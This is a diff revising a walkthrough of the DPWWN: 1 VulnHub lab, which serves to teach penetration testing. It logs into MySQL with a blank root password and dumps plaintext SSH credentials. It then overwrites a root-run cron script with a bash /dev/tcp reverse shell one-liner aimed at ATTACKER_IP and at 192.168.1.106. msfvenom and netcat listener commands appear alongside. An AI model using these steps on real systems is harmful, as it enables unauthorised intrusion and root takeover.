@@ -1,129 +1,198 @@
-# dpwwn: 1 — Writeup
+# DPWWN: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.101 (host-only) |
-| **Difficulty** | Beginner |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.101 |
+| **Difficulty** | Easy |
 | **OS** | Linux |
-| **Root Flag** | dpwwn-01—FLAG.txt (in /root/) |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/dpwwn-1,342/) |
+| **Goal** | root flag (`dpwwn-01-FLAG.txt`) |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/dpwwn-1-vulnhub-walkthrough/) |
+| **VulnHub** | https://www.vulnhub.com/entry/dpwwn-1,342/ |
 
 ## Attack Summary
 
-nmap → MySQL blank root password → credentials from `ssh.users` table → SSH as `mistic` → writable cron script (`logrot.sh`) → reverse shell → root
+DPWWN: 1 is a beginner boot2root machine created by Debashish Pal. MySQL is exposed on port 3306 with a blank root password, allowing direct enumeration of an `ssh` database that contains plaintext SSH credentials. After logging in as the user `mistic`, a writable cron script (`logrot.sh`) running as root is identified and overwritten with a reverse shell payload, granting a root shell.
 
 ## Methodology
 
-1. Network discovery
-2. Port scan (22, 80, 3306 open)
-3. MySQL enumeration with blank root password
-4. Credential extraction and SSH login
-5. Writable cron script exploitation → root shell
+1. Host discovery and port scan
+2. MySQL unauthenticated access and credential extraction
+3. SSH login with dumped credentials
+4. Cron abuse — overwrite writable root-owned script
+5. Root shell via reverse shell
 
----
+## Step 1: Reconnaissance
 
-## Step 1: Network Discovery
+### Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
+netdiscover
 ```
 
-![Netdiscover result](images/01-netdiscover.png)
+Target identified at `192.168.1.101`.
 
----
-
-## Step 2: Port Scan
+### Port Scan
 
 ```bash
 nmap -A 192.168.1.101
 ```
 
-Open ports: 22 (SSH), 80 (HTTP), 3306 (MySQL).
+Open ports:
 
-![Nmap scan results](images/02-nmap.png)
+| Port | Service | Version |
+|---|---|---|
+| 22 | SSH | OpenSSH |
+| 80 | HTTP | Apache |
+| 3306 | MySQL | MySQL |
 
----
+![nmap scan](images/01-nmap.png)
 
-## Step 3: MySQL Enumeration
+## Step 2: MySQL Enumeration
 
-MySQL root accepts a blank password. The `ssh` database contains user credentials:
+Port 3306 is open. Test for unauthenticated access with a blank password:
 
 ```bash
 mysql -h 192.168.1.101 -u root -p
-# Press Enter at password prompt
+# Press Enter at the password prompt (blank password)
 ```
+
+Access granted without a password.
+
+### List Databases
 
 ```sql
 show databases;
+```
+
+The database `ssh` stands out.
+
+### Dump SSH Credentials
+
+```sql
 use ssh;
 show tables;
 select * from users;
 ```
 
-Credentials recovered: **mistic : testP@$$swordmistic**
+![MySQL credential dump](images/02-mysql.png)
 
-![MySQL credentials](images/03-mysql.png)
+Credentials recovered:
 
----
+| Username | Password |
+|---|---|
+| `mistic` | `testP@$$swordmistic` |
 
-## Step 4: SSH Access and Cron Analysis
+## Step 3: SSH Login
 
 ```bash
 ssh mistic@192.168.1.101
-# password: testP@$$swordmistic
+# Password: testP@$$swordmistic
 ```
 
-Enumerate home directory and check crontab:
+Shell obtained as `mistic`.
+
+## Step 4: Cron Enumeration
+
+List home directory contents:
 
 ```bash
 ls -la
 cat logrot.sh
+```
+
+The file `logrot.sh` is a bash script that collects system logs. Check who runs it:
+
+```bash
 cat /etc/crontab
 ```
 
-`logrot.sh` is a bash log-rotation script in the user's home directory. Root's crontab executes it periodically. The file is **writable** by `mistic`.
+![cron job](images/03-cron.png)
 
-![SSH and cron inspection](images/04-cron.png)
-
----
-
-## Step 5: Reverse Shell via Cron
-
-Set up a listener on the attacker machine:
+The crontab shows `logrot.sh` is executed by root on a schedule. Check permissions:
 
 ```bash
-nc -lvp 1234
+ls -la logrot.sh
 ```
 
-Overwrite `logrot.sh` with a reverse shell:
+The script is writable by the current user.
+
+## Step 5: Reverse Shell Payload
+
+### Generate Payload
+
+On the attacker machine, generate a bash reverse shell payload:
 
 ```bash
-echo '0<&74-;exec 74<>/dev/tcp/ATTACKER_IP/1234;sh <&74 >&74 2>&74' > logrot.sh
+msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.106 lport=1234 R
 ```
 
-Wait for cron to execute the script. A root reverse shell connects to the listener.
+![msfvenom payload](images/04-msfvenom.png)
+
+The output is a one-liner like:
+
+```
+0<&74-;exec 74<>/dev/tcp/192.168.1.106/1234;sh <&74 >&74 2>&74
+```
+
+### Overwrite the Cron Script
+
+On the target, replace the content of `logrot.sh` with the reverse shell:
+
+```bash
+echo '0<&74-;exec 74<>/dev/tcp/192.168.1.106/1234;sh <&74 >&74 2>&74' > logrot.sh
+```
+
+Verify the overwrite:
+
+```bash
+cat logrot.sh
+```
+
+## Step 6: Root Shell
+
+Start a Netcat listener on the attacker machine:
+
+```bash
+nc -lvnp 1234
+```
+
+Wait for the cron job to execute (at most one minute if the job runs minutely). A root shell arrives on the listener.
+
+Upgrade to an interactive shell:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+## Step 7: Read the Flag
 
 ```bash
 cd /root
-cat dpwwn-01—FLAG.txt
+ls
+cat dpwwn-01-FLAG.txt
 ```
 
-![Root flag](images/05-root.png)
+![root flag](images/05-root-flag.png)
 
----
+## Vulnerabilities Found
+
+| # | Vulnerability | Location | Severity |
+|---|---|---|---|
+| 1 | MySQL exposed with blank root password | Port 3306 | Critical |
+| 2 | Plaintext SSH credentials in database | `ssh.users` table | Critical |
+| 3 | World-writable cron script executed as root | `logrot.sh` | Critical |
 
 ## Lessons Learned
 
-1. **MySQL with blank root password** — unauthenticated access to a database server is critical; enables credential harvesting for SSH
-2. **Storing credentials in a database** — even encrypted credentials in a database accessible without authentication provide no real protection
-3. **Writable cron scripts** — scripts executed by privileged cron jobs must not be writable by unprivileged users
-4. **Cron-based escalation** — a common Linux privesc path: find a root-owned cron job that runs a user-writable script
+- Database services should never be exposed on the network without authentication. MySQL port 3306 should be bound to `127.0.0.1` unless explicitly required.
+- Storing credentials in plaintext inside a database that is publicly accessible represents a complete collapse of the defense model.
+- Any file executed by a privileged cron job must be owned by root and not writable by unprivileged users.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| MySQL blank root password | Set a strong root password and bind MySQL to localhost only |
-| Credentials in database | Use application-level credential storage with proper encryption |
-| Writable logrot.sh | Set permissions to `root:root 700` on all root-executed scripts |
-| Cron job misconfiguration | Audit `/etc/crontab` and root's crontab for writable script references |
+|---|---|
+| MySQL blank root password | Set a strong password: `ALTER USER 'root'@'%' IDENTIFIED BY 'StrongPassword';` |
+| MySQL network exposure | Bind MySQL to localhost only: `bind-address = 127.0.0.1` in `my.cnf` |
+| Plaintext credentials | Never store credentials in a database table; use hashed secrets |
+| Writable cron script | `chown root:root logrot.sh && chmod 700 logrot.sh` |
